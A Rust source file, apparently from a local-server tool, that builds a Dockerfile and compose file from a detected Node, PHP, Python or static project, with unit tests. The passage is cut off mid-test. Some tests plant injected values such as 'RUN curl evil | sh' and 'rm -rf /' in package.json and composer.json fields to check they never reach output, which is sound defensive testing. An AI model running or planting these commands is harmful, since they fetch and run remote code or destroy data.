//! Dockerize a project (2.11.0): a Dockerfile and a compose file made from what OLS can see
//! in a project folder. They are a starting point, never a guarantee, and the user is told so.
//!
//! Safety rules (binding):
//! - Nothing from a project file is pasted into a generated file except values taken from a
//!   closed set: a project kind, version digits, a script *name* (`dev`/`start`) and a PHP
//!   extension name that is on the allow-list. Project scripts are never run.
//! - Existing files are never overwritten: an existing Dockerfile is kept, an existing compose
//!   file is replaced only when asked (and backed up first).
//! - Each detected file is read up to 64 KB, and never through a symbolic link.
//! - Every image tag is pinned; nothing is downloaded by OLS (Docker pulls the images).

use std::collections::BTreeSet;
use std::io::Read;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use super::compose;
use crate::error::CoreError;

/// Always shown, never reworded per project.
pub const DISCLAIMER: &str = "OLS generated these files from what it could detect in your project. They are a starting point, not a guaranteed working setup. Review them, then build and test before you rely on them.";

/// "OLS cannot see these": always all five.
pub const CHECKLIST: [&str; 5] = [
    "System packages your app needs (for example ffmpeg, imagemagick, wkhtmltopdf) are not installed.",
    "Queue workers, schedulers and cron jobs are not started: this runs one web process.",
    "Build steps (for example npm run build, composer install --no-dev, asset compilation) are only included when listed above.",
    "Your .env file and other secrets are not copied into the image: pass them with environment variables.",
    "Services your app talks to (database, cache, mail) are not created: add them in Docker → Compose, or connect to the ones OLS runs.",
];

/// The installer image's fixed tag. A maintainer must confirm it exists (ideally add
/// `@sha256:<digest>`); it is never `latest`.
pub const PHP_EXT_INSTALLER: &str = "2.7";

/// Extensions OLS may install. Anything else is reported, never written to a file.
pub const PHP_EXT_ALLOW: &[&str] = &[
    "bcmath",
    "calendar",
    "exif",
    "gd",
    "gettext",
    "imagick",
    "intl",
    "mysqli",
    "opcache",
    "pcntl",
    "pdo_mysql",
    "pdo_pgsql",
    "pgsql",
    "redis",
    "soap",
    "sockets",
    "sysvsem",
    "xsl",
    "zip",
    "apcu",
    "memcached",
    "mongodb",
    "xdebug",
];

/// Built into the official `php` image: needing one of these asks for nothing.
const PHP_BUILTIN: &[&str] = &[
    "core",
    "ctype",
    "curl",
    "date",
    "dom",
    "fileinfo",
    "filter",
    "ftp",
    "hash",
    "iconv",
    "json",
    "libxml",
    "mbstring",
    "mysqlnd",
    "openssl",
    "pcre",
    "pdo",
    "pdo_sqlite",
    "phar",
    "posix",
    "readline",
    "reflection",
    "session",
    "simplexml",
    "sodium",
    "spl",
    "sqlite3",
    "standard",
    "tokenizer",
    "xml",
    "xmlreader",
    "xmlwriter",
    "zlib",
];

const MAX_READ: u64 = 64 * 1024;

#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
pub struct DockerizePlan {
    /// `node`, `php`, `python` or `static`.
    pub kind: String,
    /// `None` when a Dockerfile already exists (it is kept).
    pub dockerfile: Option<String>,
    pub compose: String,
    pub dockerfile_path: String,
    pub compose_path: String,
    /// Files that already exist and will not be overwritten.
    pub existing: Vec<String>,
    pub port: u16,
    pub notes: Vec<String>,
    /// PHP only: extensions that will be installed.
    pub php_extensions: Vec<String>,
    /// PHP only: needed but not installable by OLS.
    pub unknown_extensions: Vec<String>,
    /// What OLS found and where; defaults say "default", inferred values say "guessed".
    pub detected: Vec<String>,
    pub disclaimer: String,
    pub checklist: Vec<String>,
}

fn bad(problem: &str, cause: impl Into<String>, fix: &str) -> CoreError {
    CoreError::failed_fix(problem, cause, fix)
}

/// Reads up to 64 KB of a regular file (not a link) inside the project.
fn read_small(dir: &Path, name: &str) -> Option<String> {
    let p = dir.join(name);
    let meta = std::fs::symlink_metadata(&p).ok()?;
    if !meta.file_type().is_file() {
        return None;
    }
    let mut text = String::new();
    let mut raw = Vec::new();
    std::fs::File::open(&p)
        .ok()?
        .take(MAX_READ)
        .read_to_end(&mut raw)
        .ok()?;
    text.push_str(&String::from_utf8_lossy(&raw));
    Some(text)
}

fn exists(dir: &Path, name: &str) -> bool {
    std::fs::symlink_metadata(dir.join(name)).is_ok()
}

/// The folder name as a compose service name.
fn slug(dir: &Path) -> String {
    let raw = dir
        .file_name()
        .map(|n| n.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    let s: String = raw
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
                c
            } else {
                '-'
            }
        })
        .collect();
    let s = s.trim_matches('-').to_string();
    if s.is_empty() || !s.chars().next().is_some_and(|c| c.is_ascii_alphanumeric()) {
        "app".into()
    } else {
        s
    }
}

/// Digits of the first number in `text` (`^8.3` -> `8.3`; `>=20` -> `20`).
fn first_number(text: &str) -> Option<(u32, Option<u32>)> {
    let re = regex::Regex::new(r"(\d{1,3})(?:\.(\d{1,3}))?").ok()?;
    let c = re.captures(text)?;
    let major = c[1].parse().ok()?;
    let minor = c.get(2).and_then(|m| m.as_str().parse().ok());
    Some((major, minor))
}

/// Keeps only characters that are safe inside a YAML/Dockerfile comment.
fn comment_safe(text: &str) -> String {
    let ok = |c: char| c.is_ascii_alphanumeric() || " .,:;()_/\"'=^~<>-".contains(c);
    text.chars()
        .map(|c| if ok(c) { c } else { '?' })
        .take(300)
        .collect()
}

fn header(detected: &[String]) -> String {
    format!(
        "# Generated by Open Local Server (Docker -> Dockerize a project).\n# Starting point only, NOT guaranteed to work: review it, then build and test it.\n# Detected: {}\n",
        comment_safe(&detected.join("; "))
    )
}

fn yq(s: &str) -> String {
    let mut out = String::from("\"");
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            c if c.is_control() => {}
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Extension names the project asks for. `declared` come from composer files; `guessed` from
/// `.env.example` / `.env` and the kind of project.
fn needed_php_extensions(dir: &Path) -> (BTreeSet<String>, BTreeSet<String>, bool) {
    let mut declared = BTreeSet::new();
    let mut invalid = false;
    let re = regex::Regex::new(r#""ext-([^"]{1,64})""#).expect("valid regex");
    for file in ["composer.json", "composer.lock"] {
        let Some(text) = read_small(dir, file) else {
            continue;
        };
        for c in re.captures_iter(&text) {
            let name = c[1].to_lowercase();
            if !name.is_empty()
                && name
                    .chars()
                    .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
            {
                declared.insert(name);
            } else {
                invalid = true;
            }
        }
    }
    let mut guessed = BTreeSet::new();
    let env = read_small(dir, ".env.example").or_else(|| read_small(dir, ".env"));
    if let Some(env) = env {
        for line in env.lines() {
            let Some((key, value)) = line.split_once('=') else {
                continue;
            };
            let value = value
                .trim()
                .trim_matches(|c| c == '"' || c == '\'')
                .to_lowercase();
            match (key.trim(), value.as_str()) {
                ("DB_CONNECTION", "mysql" | "mariadb") => {
                    guessed.insert("pdo_mysql".to_string());
                }
                ("DB_CONNECTION", "pgsql") => {
                    guessed.insert("pdo_pgsql".to_string());
                }
                ("DB_CONNECTION", "sqlsrv") => {
                    guessed.insert("pdo_sqlsrv".to_string());
                }
                (
                    "CACHE_DRIVER" | "CACHE_STORE" | "SESSION_DRIVER" | "QUEUE_CONNECTION",
                    "redis",
                ) => {
                    guessed.insert("redis".to_string());
                }
                _ => {}
            }
        }
    }
    if exists(dir, "artisan") {
        guessed.extend(["pdo_mysql", "zip", "bcmath", "intl", "gd"].map(String::from));
    }
    if is_wordpress(dir) {
        guessed.extend(
            ["mysqli", "gd", "zip", "intl", "exif", "imagick", "opcache"].map(String::from),
        );
    }
    (declared, guessed, invalid)
}

fn compose_file_in(dir: &Path) -> Option<String> {
    compose::COMPOSE_FILE_NAMES
        .iter()
        .find(|n| exists(dir, n))
        .map(|n| n.to_string())
}

struct Built {
    kind: &'static str,
    dockerfile: String,
    port: u16,
    dev_mount: bool,
    detected: Vec<String>,
    notes: Vec<String>,
    php_extensions: Vec<String>,
    unknown_extensions: Vec<String>,
}

fn build_node(dir: &Path) -> Built {
    let mut detected = vec!["Project type: Node.js (found package.json)".to_string()];
    let mut notes = Vec::new();
    let from_nvm = read_small(dir, ".nvmrc").and_then(|t| first_number(&t));
    let package: Option<serde_json::Value> =
        read_small(dir, "package.json").and_then(|t| serde_json::from_str(&t).ok());
    if package.is_none() {
        notes.push("package.json could not be read as JSON: defaults were used.".to_string());
    }
    let from_engines = package
        .as_ref()
        .and_then(|p| p.pointer("/engines/node"))
        .and_then(|v| v.as_str())
        .and_then(first_number);
    let (major, src) = match (from_nvm, from_engines) {
        (Some((m, _)), _) => (m, "from .nvmrc"),
        (None, Some((m, _))) => (m, "from package.json engines.node"),
        _ => (22, "default: no .nvmrc or engines.node found"),
    };
    let major = major.clamp(18, 24);
    detected.push(format!("Node {major} ({src})"));
    let has = |s: &str| {
        package
            .as_ref()
            .and_then(|p| p.pointer(&format!("/scripts/{s}")))
            .is_some()
    };
    let (cmd, cmd_json) = if has("dev") {
        detected.push("Start command: npm run dev (from package.json scripts)".into());
        ("npm run dev", r#"["npm", "run", "dev"]"#)
    } else if has("start") {
        detected.push("Start command: npm start (from package.json scripts)".into());
        ("npm start", r#"["npm", "start"]"#)
    } else {
        detected.push("Start command: node . (default: no dev or start script found)".into());
        notes.push(
            "No dev or start script found in package.json: the container runs `node .`.".into(),
        );
        ("node .", r#"["node", "."]"#)
    };
    if cmd.starts_with("npm run dev") {
        notes.push("Dev servers such as Vite listen on localhost only unless started with --host: set that in your dev script if the page does not load.".into());
    }
    detected.push(
        "Port: 3000 (guessed: Node apps commonly use 3000, change it if yours differs)".into(),
    );
    let dockerfile = format!(
        "FROM node:{major}-alpine\nWORKDIR /app\nCOPY package*.json ./\nRUN npm install\nCOPY . .\nEXPOSE 3000\nCMD {cmd_json}\n"
    );
    Built {
        kind: "node",
        dockerfile,
        port: 3000,
        dev_mount: true,
        detected,
        notes,
        php_extensions: vec![],
        unknown_extensions: vec![],
    }
}

/// WordPress has no composer.json: its own files give it away.
fn is_wordpress(dir: &Path) -> bool {
    [
        "wp-config.php",
        "wp-config-sample.php",
        "wp-load.php",
        "wp-content",
    ]
    .iter()
    .any(|n| exists(dir, n))
}

fn build_php(dir: &Path) -> Built {
    let laravel = exists(dir, "artisan");
    let wordpress = is_wordpress(dir);
    let mut detected = Vec::new();
    detected.push(if laravel {
        "Project type: Laravel (found artisan and composer.json)".to_string()
    } else if wordpress {
        "Project type: WordPress (found wp-config.php, wp-load.php or wp-content)".to_string()
    } else {
        "Project type: PHP (found composer.json)".to_string()
    });
    let mut notes = Vec::new();
    let composer = read_small(dir, "composer.json");
    let require_php = composer
        .as_deref()
        .and_then(|t| serde_json::from_str::<serde_json::Value>(t).ok())
        .and_then(|v| {
            v.pointer("/require/php")
                .and_then(|p| p.as_str().map(String::from))
        });
    let minor = require_php
        .as_deref()
        .and_then(first_number)
        .filter(|(maj, _)| *maj == 8)
        .and_then(|(_, m)| m)
        .map(|m| m.clamp(1, 5));
    let minor_value = match minor {
        Some(m) => {
            detected.push(format!("PHP 8.{m} (from composer.json require.php)"));
            m
        }
        None => {
            detected.push(
                "PHP 8.3 (default: composer.json has no usable \"php\" requirement)".to_string(),
            );
            3
        }
    };

    let (declared, guessed, invalid) = needed_php_extensions(dir);
    let mut unknown: BTreeSet<String> = BTreeSet::new();
    let mut chosen: BTreeSet<String> = BTreeSet::new();
    for name in declared.iter().chain(guessed.iter()) {
        if PHP_BUILTIN.contains(&name.as_str()) {
            continue;
        }
        if PHP_EXT_ALLOW.contains(&name.as_str()) {
            chosen.insert(name.clone());
        } else {
            unknown.insert(name.clone());
        }
    }
    if invalid {
        unknown.insert("invalid-name".into());
    }
    for name in &unknown {
        notes.push(format!(
            "Needs the PHP extension {name}, which OLS cannot install automatically: add it to the Dockerfile yourself."
        ));
    }
    let guessed_only: Vec<&String> = chosen.iter().filter(|n| !declared.contains(*n)).collect();
    if !guessed_only.is_empty() {
        detected.push(format!(
            "PHP extensions {} (guessed from your .env / project type)",
            guessed_only
                .iter()
                .map(|s| s.as_str())
                .collect::<Vec<_>>()
                .join(", ")
        ));
        notes.push(
            "Some PHP extensions were guessed from your .env / project type: check the list."
                .into(),
        );
    }
    let declared_chosen: Vec<&String> = chosen.iter().filter(|n| declared.contains(*n)).collect();
    if !declared_chosen.is_empty() {
        detected.push(format!(
            "PHP extensions {} (declared in composer.json / composer.lock)",
            declared_chosen
                .iter()
                .map(|s| s.as_str())
                .collect::<Vec<_>>()
                .join(", ")
        ));
    }
    if let Some(db) = read_small(dir, ".env.example").or_else(|| read_small(dir, ".env")) {
        for line in db.lines() {
            if let Some(("DB_CONNECTION", v)) = line.split_once('=').map(|(k, v)| (k.trim(), v)) {
                let label = match v
                    .trim()
                    .trim_matches(|c| c == '"' || c == '\'')
                    .to_lowercase()
                    .as_str()
                {
                    "mysql" | "mariadb" => Some("MySQL"),
                    "pgsql" => Some("PostgreSQL"),
                    "sqlsrv" => Some("SQL Server"),
                    "sqlite" => Some("SQLite"),
                    _ => None,
                };
                if let Some(label) = label {
                    detected.push(format!(
                        "Database: {label} (from .env.example / .env DB_CONNECTION)"
                    ));
                }
                break;
            }
        }
    }
    detected.push("Port: 80 (Apache in the php image)".into());

    let mut df = format!("FROM php:8.{minor_value}-apache\n");
    let extensions: Vec<String> = chosen.into_iter().collect();
    if !extensions.is_empty() {
        df.push_str(&format!(
            "COPY --from=ghcr.io/mlocati/php-extension-installer:{PHP_EXT_INSTALLER} /usr/bin/install-php-extensions /usr/local/bin/\nRUN install-php-extensions {}\n",
            extensions.join(" ")
        ));
    }
    if composer.is_some() {
        df.push_str("COPY --from=composer:2 /usr/bin/composer /usr/bin/composer\n");
    }
    if laravel {
        df.push_str("ENV APACHE_DOCUMENT_ROOT /var/www/html/public\nRUN sed -ri -e 's!/var/www/html!${APACHE_DOCUMENT_ROOT}!g' /etc/apache2/sites-available/*.conf && sed -ri -e 's!/var/www/!${APACHE_DOCUMENT_ROOT}!g' /etc/apache2/apache2.conf /etc/apache2/conf-available/*.conf\n");
        detected.push("Web root: public/ (Laravel, found artisan)".into());
    }
    df.push_str("RUN a2enmod rewrite\nCOPY . /var/www/html\nEXPOSE 80\n");
    if wordpress {
        notes.push("WordPress needs a database: set the host, name and user in wp-config.php (or environment variables) to a database service you add in Docker → Compose.".into());
    }
    notes.push("Dependencies are not installed by the image: run composer install in the container if your project needs vendor/.".into());
    Built {
        kind: "php",
        dockerfile: df,
        port: 80,
        dev_mount: false,
        detected,
        notes,
        php_extensions: extensions,
        unknown_extensions: unknown.into_iter().collect(),
    }
}

fn build_python(dir: &Path) -> Built {
    let mut detected = Vec::new();
    let mut notes = Vec::new();
    let req = exists(dir, "requirements.txt");
    detected.push(if req {
        "Project type: Python (found requirements.txt)".to_string()
    } else {
        "Project type: Python (found pyproject.toml)".to_string()
    });
    detected.push("Python 3.12 (default: pinned python:3.12-slim)".into());
    let install = if req {
        "COPY requirements.txt ./\nRUN pip install --no-cache-dir -r requirements.txt\n"
    } else {
        notes.push("Only pyproject.toml was found: the image installs the project with pip install . — check that it builds.".into());
        "COPY pyproject.toml ./\n"
    };
    let (cmd_json, tail) = if exists(dir, "manage.py") {
        detected.push("Start command: python manage.py runserver (Django, found manage.py)".into());
        (
            r#"["python", "manage.py", "runserver", "0.0.0.0:8000"]"#,
            "",
        )
    } else if read_small(dir, "main.py").is_some_and(|t| t.contains("FastAPI")) {
        detected.push("Start command: uvicorn main:app (FastAPI, found in main.py)".into());
        (
            r#"["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]"#,
            "",
        )
    } else {
        detected.push(
            "Start command: python main.py (default: no manage.py or FastAPI app found)".into(),
        );
        notes.push(
            "No Django or FastAPI app was recognised: the container runs `python main.py`.".into(),
        );
        (r#"["python", "main.py"]"#, "")
    };
    detected.push("Port: 8000 (guessed: the usual port for Django and uvicorn)".into());
    let post = if req {
        "COPY . .\n".to_string()
    } else {
        "COPY . .\nRUN pip install --no-cache-dir .\n".to_string()
    };
    let dockerfile = format!(
        "FROM python:3.12-slim\nWORKDIR /app\nENV PYTHONUNBUFFERED=1\n{install}{post}{tail}EXPOSE 8000\nCMD {cmd_json}\n"
    );
    Built {
        kind: "python",
        dockerfile,
        port: 8000,
        dev_mount: true,
        detected,
        notes,
        php_extensions: vec![],
        unknown_extensions: vec![],
    }
}

fn build_static() -> Built {
    Built {
        kind: "static",
        dockerfile: "FROM nginx:1.28-alpine\nCOPY . /usr/share/nginx/html\nEXPOSE 80\n".into(),
        port: 80,
        dev_mount: false,
        detected: vec![
            "Project type: Static site (found index.html)".into(),
            "Port: 80 (nginx)".into(),
        ],
        notes: vec![],
        php_extensions: vec![],
        unknown_extensions: vec![],
    }
}

/// Builds the plan without touching the disk. `is_free` says whether a host port is usable.
pub fn plan(
    project_dir: &Path,
    _project_type: Option<&str>,
    is_free: &dyn Fn(u16) -> bool,
) -> Result<DockerizePlan, CoreError> {
    if !project_dir.is_dir() {
        return Err(bad(
            "That project folder was not found.",
            format!("{} is not a folder on disk.", project_dir.display()),
            "Check that the folder still exists, or remove the project from the list.",
        ));
    }
    let built = if is_wordpress(project_dir) || exists(project_dir, "composer.json") {
        build_php(project_dir)
    } else if exists(project_dir, "package.json") {
        build_node(project_dir)
    } else if exists(project_dir, "requirements.txt") || exists(project_dir, "pyproject.toml") {
        build_python(project_dir)
    } else if exists(project_dir, "index.html") {
        build_static()
    } else {
        return Err(bad(
            "OLS could not recognise this project.",
            "None of composer.json, package.json, requirements.txt, pyproject.toml or index.html was found at the top of the folder.",
            "Dockerize supports PHP (composer.json), Node (package.json), Python (requirements.txt or pyproject.toml) and static sites (index.html). Write a Dockerfile by hand for anything else.",
        ));
    };

    let host =
        (0..200u16)
            .filter_map(|o| built.port.checked_add(o))
            .find(|p| is_free(*p))
            .ok_or_else(|| {
                bad(
                "No free port was found.",
                format!("Ports {}–{} are all in use.", built.port, built.port.saturating_add(199)),
                "Stop something that uses them, or write the port in the compose file yourself.",
            )
            })?;

    let mut existing = Vec::new();
    let dockerfile_exists = exists(project_dir, "Dockerfile");
    if dockerfile_exists {
        existing.push("Dockerfile".to_string());
    }
    let existing_compose = compose_file_in(project_dir);
    if let Some(name) = &existing_compose {
        existing.push(name.clone());
    }
    let mut notes = built.notes.clone();
    if dockerfile_exists {
        notes.push(
            "A Dockerfile already exists and is kept: the compose file builds from it.".into(),
        );
    }
    if existing_compose.is_some() {
        notes.push("A compose file already exists: it is only replaced if you choose to (the old one is backed up).".into());
    }

    let head = header(&built.detected);
    let name = slug(project_dir);
    let mut compose_text = format!(
        "{head}services:\n  {name}:\n    build: .\n    image: {}\n    ports:\n      - {}\n",
        // Names the image OLS builds, so it is easy to find on the Images tab.
        yq(&format!("{name}:local")),
        yq(&format!("127.0.0.1:{host}:{}", built.port))
    );
    if built.dev_mount {
        let mount = if built.kind == "node" {
            "    volumes:\n      - \"./:/app\"\n      - \"/app/node_modules\"\n"
        } else {
            "    volumes:\n      - \"./:/app\"\n"
        };
        compose_text.push_str(mount);
    }
    compose_text.push_str("    restart: unless-stopped\n    labels:\n      dev.ols.managed: \"true\"\n    extra_hosts:\n      - \"host.docker.internal:host-gateway\"\n");
    let check = compose::check_text(&compose_text);
    if !check.ok {
        return Err(bad(
            "OLS made a compose file that did not pass its own check.",
            check.errors.join(" "),
            "This is a bug in OLS: write the compose file by hand and report the problem.",
        ));
    }

    let dockerfile = (!dockerfile_exists).then(|| format!("{head}{}", built.dockerfile));
    let compose_name = existing_compose.unwrap_or_else(|| "compose.yaml".to_string());
    Ok(DockerizePlan {
        kind: built.kind.into(),
        dockerfile,
        compose: compose_text,
        dockerfile_path: project_dir.join("Dockerfile").display().to_string(),
        compose_path: project_dir.join(compose_name).display().to_string(),
        existing,
        port: host,
        notes,
        php_extensions: built.php_extensions,
        unknown_extensions: built.unknown_extensions,
        detected: built.detected,
        disclaimer: DISCLAIMER.into(),
        checklist: CHECKLIST.iter().map(|s| s.to_string()).collect(),
    })
}

const DOCKERIGNORE: &str = "# Generated by Open Local Server (Docker -> Dockerize a project). Review it.\nnode_modules\n.git\nvendor\n.env\n__pycache__\n";

/// Writes the files. Never overwrites: a Dockerfile that exists is left alone, and a compose
/// file that exists needs `overwrite_compose` (the old one is saved under `backups_dir`).
pub fn write(
    plan: &DockerizePlan,
    overwrite_compose: bool,
    backups_dir: &Path,
) -> Result<(), CoreError> {
    let compose_path = PathBuf::from(&plan.compose_path);
    let compose_exists = std::fs::symlink_metadata(&compose_path).is_ok();
    if compose_exists && !overwrite_compose {
        return Err(bad(
            "This folder already has a compose file.",
            format!("{} exists.", compose_path.display()),
            "Open it from the Compose tab, or choose to replace it (the old file is backed up).",
        ));
    }
    let io = |what: &str, p: &Path, e: std::io::Error| {
        bad(
            "A file could not be written.",
            format!("{what} {}: {e}", p.display()),
            "Check that the project folder is writable.",
        )
    };
    let dir = compose_path.parent().unwrap_or(Path::new("."));
    if let Some(text) = &plan.dockerfile {
        let p = PathBuf::from(&plan.dockerfile_path);
        // create_new: a Dockerfile that appeared since the preview is never replaced.
        let mut f = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&p)
            .map_err(|e| io("creating", &p, e))?;
        std::io::Write::write_all(&mut f, text.as_bytes()).map_err(|e| io("writing", &p, e))?;
    }
    if compose_exists {
        compose::save_file(&plan.compose_path, &plan.compose, backups_dir)?;
    } else {
        let mut f = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&compose_path)
            .map_err(|e| io("creating", &compose_path, e))?;
        std::io::Write::write_all(&mut f, plan.compose.as_bytes())
            .map_err(|e| io("writing", &compose_path, e))?;
    }
    let ignore = dir.join(".dockerignore");
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&ignore)
    {
        let _ = std::io::Write::write_all(&mut f, DOCKERIGNORE.as_bytes());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dir() -> tempfile::TempDir {
        tempfile::tempdir().unwrap()
    }
    fn put(d: &Path, name: &str, text: &str) {
        std::fs::write(d.join(name), text).unwrap();
    }
    fn free(_: u16) -> bool {
        true
    }
    fn make(d: &Path) -> DockerizePlan {
        plan(d, None, &free).unwrap()
    }
    fn sample(kind: &str) -> tempfile::TempDir {
        let d = dir();
        match kind {
            "node" => put(d.path(), "package.json", r#"{"scripts":{"dev":"vite"}}"#),
            "php" => put(d.path(), "composer.json", r#"{"require":{"php":"^8.2"}}"#),
            "python" => {
                put(d.path(), "requirements.txt", "django\n");
                put(d.path(), "manage.py", "");
            }
            _ => put(d.path(), "index.html", "<html></html>"),
        }
        d
    }

    #[test]
    fn every_kind_carries_the_fixed_honesty_block() {
        for kind in ["node", "php", "python", "static"] {
            let d = sample(kind);
            let p = make(d.path());
            assert_eq!(p.kind, kind);
            assert_eq!(p.disclaimer, DISCLAIMER);
            assert_eq!(p.checklist.len(), 5);
            assert_eq!(p.checklist, CHECKLIST.to_vec());
            assert!(!p.detected.is_empty());
            for text in [p.dockerfile.as_ref().unwrap(), &p.compose] {
                let first: Vec<&str> = text.lines().take(3).collect();
                assert!(
                    first.iter().all(|l| l.starts_with('#')),
                    "{kind}: {first:?}"
                );
                assert!(first[0].starts_with("# Generated by Open Local Server"));
                assert!(first[2].starts_with("# Detected: "));
            }
            assert!(compose::check_text(&p.compose).ok, "{kind}");
            assert!(
                p.compose.contains(":local\""),
                "{kind}: the built image is named"
            );
        }
    }

    #[test]
    fn an_empty_folder_is_refused() {
        let d = dir();
        let e = plan(d.path(), None, &free).unwrap_err().to_string();
        assert!(e.contains("OLS could not recognise this project."), "{e}");
    }

    #[test]
    fn defaults_say_default() {
        let d = dir();
        put(d.path(), "package.json", r#"{"name":"x"}"#);
        let p = make(d.path());
        assert!(p
            .detected
            .iter()
            .any(|s| s.contains("Node 22") && s.contains("default")));
        assert!(p.dockerfile.unwrap().contains("FROM node:22-alpine"));
    }

    #[test]
    fn node_uses_nvmrc_and_the_dev_script() {
        let d = dir();
        put(
            d.path(),
            "package.json",
            r#"{"scripts":{"dev":"vite","start":"x"}}"#,
        );
        put(d.path(), ".nvmrc", "v20.11.0\n");
        let p = make(d.path());
        let df = p.dockerfile.unwrap();
        assert!(df.contains("FROM node:20-alpine"));
        assert!(df.contains(r#"CMD ["npm", "run", "dev"]"#));
        assert!(p.compose.contains("./:/app"));
        assert!(p.compose.contains("127.0.0.1:3000:3000"));
    }

    #[test]
    fn php_with_and_without_artisan() {
        let d = dir();
        put(d.path(), "composer.json", r#"{"require":{"php":"^8.2"}}"#);
        let p = make(d.path());
        let df = p.dockerfile.unwrap();
        assert!(df.contains("FROM php:8.2-apache"));
        assert!(!df.contains("APACHE_DOCUMENT_ROOT"));
        put(d.path(), "artisan", "");
        let df = make(d.path()).dockerfile.unwrap();
        assert!(df.contains("APACHE_DOCUMENT_ROOT /var/www/html/public"));
    }

    #[test]
    fn wordpress_without_composer_is_recognised() {
        let d = dir();
        put(d.path(), "wp-config.php", "<?php");
        std::fs::create_dir(d.path().join("wp-content")).unwrap();
        let p = make(d.path());
        assert_eq!(p.kind, "php");
        assert!(p.detected.iter().any(|s| s.contains("WordPress")));
        for e in ["mysqli", "gd", "imagick", "opcache"] {
            assert!(p.php_extensions.contains(&e.to_string()), "{e}");
        }
        let df = p.dockerfile.unwrap();
        assert!(df.contains("FROM php:8.3-apache"));
        assert!(!df.contains("composer:2"));
        assert!(!df.contains("APACHE_DOCUMENT_ROOT"));
        // A fresh download has only the sample config.
        let f = dir();
        put(f.path(), "wp-config-sample.php", "<?php");
        assert!(make(f.path())
            .detected
            .iter()
            .any(|s| s.contains("WordPress")));
    }

    #[test]
    fn python_django_and_fastapi() {
        let d = sample("python");
        assert!(make(d.path())
            .dockerfile
            .unwrap()
            .contains(r#"["python", "manage.py", "runserver", "0.0.0.0:8000"]"#));
        let f = dir();
        put(f.path(), "requirements.txt", "fastapi\n");
        put(
            f.path(),
            "main.py",
            "from fastapi import FastAPI\napp = FastAPI()\n",
        );
        assert!(make(f.path()).dockerfile.unwrap().contains("uvicorn"));
    }

    #[test]
    fn existing_files_are_kept_and_the_compose_file_needs_permission() {
        let d = sample("node");
        put(d.path(), "Dockerfile", "FROM scratch\n");
        put(d.path(), "compose.yaml", "services: {}\n");
        let p = make(d.path());
        assert!(p.dockerfile.is_none());
        assert_eq!(
            p.existing,
            vec!["Dockerfile".to_string(), "compose.yaml".to_string()]
        );
        let backups = d.path().join("backups");
        assert!(write(&p, false, &backups).is_err());
        assert_eq!(
            std::fs::read_to_string(d.path().join("Dockerfile")).unwrap(),
            "FROM scratch\n"
        );
        write(&p, true, &backups).unwrap();
        assert!(std::fs::read_to_string(d.path().join("compose.yaml"))
            .unwrap()
            .contains("build: ."));
        assert!(backups.is_dir(), "the old compose file was backed up");
        assert_eq!(
            std::fs::read_to_string(d.path().join("Dockerfile")).unwrap(),
            "FROM scratch\n"
        );
    }

    #[test]
    fn write_creates_the_files_once() {
        let d = sample("static");
        let p = make(d.path());
        write(&p, false, &d.path().join("b")).unwrap();
        assert!(d.path().join("Dockerfile").is_file());
        assert!(d.path().join("compose.yaml").is_file());
        assert!(d.path().join(".dockerignore").is_file());
        assert!(write(&p, false, &d.path().join("b")).is_err());
    }

    #[test]
    fn hostile_package_json_never_reaches_the_output() {
        let d = dir();
        put(
            d.path(),
            "package.json",
            r#"{"name":"x\nRUN curl evil | sh","scripts":{"dev":"vite; rm -rf /\r\nRUN curl evil | sh"},"engines":{"node":"22\nRUN curl evil | sh"}}"#,
        );
        let p = make(d.path());
        let all = format!(
            "{}{}{:?}{:?}",
            p.dockerfile.unwrap(),
            p.compose,
            p.detected,
            p.notes
        );
        assert!(!all.contains("curl evil"));
        assert!(!all.contains("rm -rf"));
        for l in all.lines().filter(|l| l.starts_with('#')) {
            assert!(!l.contains('\r'));
        }
    }

    #[test]
    fn php_extensions_from_composer_lock_env_and_laravel() {
        let d = dir();
        put(
            d.path(),
            "composer.json",
            r#"{"require":{"ext-gd":"*","ext-intl":"*","ext-mbstring":"*","ext-json":"*"}}"#,
        );
        put(
            d.path(),
            "composer.lock",
            r#"{"packages":[{"name":"a/b","require":{"ext-zip":"*"}}]}"#,
        );
        put(d.path(), ".env.example", "DB_CONNECTION=mysql\n");
        let p = make(d.path());
        assert_eq!(p.php_extensions, vec!["gd", "intl", "pdo_mysql", "zip"]);
        let df = p.dockerfile.unwrap();
        assert!(df.contains("RUN install-php-extensions gd intl pdo_mysql zip"));
        assert!(df.contains(&format!("php-extension-installer:{PHP_EXT_INSTALLER}")));
        assert!(!df.contains("latest"));
        assert!(df.contains("COPY --from=composer:2"));
    }

    #[test]
    fn laravel_gets_its_default_set_and_sqlsrv_is_reported_not_installed() {
        let d = dir();
        put(d.path(), "composer.json", "{}");
        put(d.path(), "artisan", "");
        put(d.path(), ".env.example", "DB_CONNECTION=sqlsrv\n");
        let p = make(d.path());
        for e in ["pdo_mysql", "zip", "bcmath", "intl", "gd"] {
            assert!(p.php_extensions.contains(&e.to_string()), "{e}");
        }
        assert!(p.unknown_extensions.contains(&"pdo_sqlsrv".to_string()));
        assert!(!p.dockerfile.unwrap().contains("pdo_sqlsrv"));
        assert!(p.notes.iter().any(|n| n.contains("pdo_sqlsrv")));
    }

    #[test]
    fn builtin_extensions_need_no_install_line() {
        let d = dir();
        put(
            d.path(),
            "composer.json",
            r#"{"require":{"ext-mbstring":"*","ext-json":"*"}}"#,
        );
        let p = make(d.path());
        assert!(p.php_extensions.is_empty());
        let df = p.dockerfile.unwrap();
        assert!(!df.contains("install-php-extensions"));
        assert!(!df.contains("ghcr.io"));
        assert!(!df.contains("latest"));
    }

    #[test]
    fn hostile_extension_names_are_contained() {
        let d = dir();
        put(
            d.path(),
            "composer.json",
            r#"{"require":{"ext-gd; rm -rf /":"*"}}"#,
        );
        put(
            d.path(),
            ".env.example",
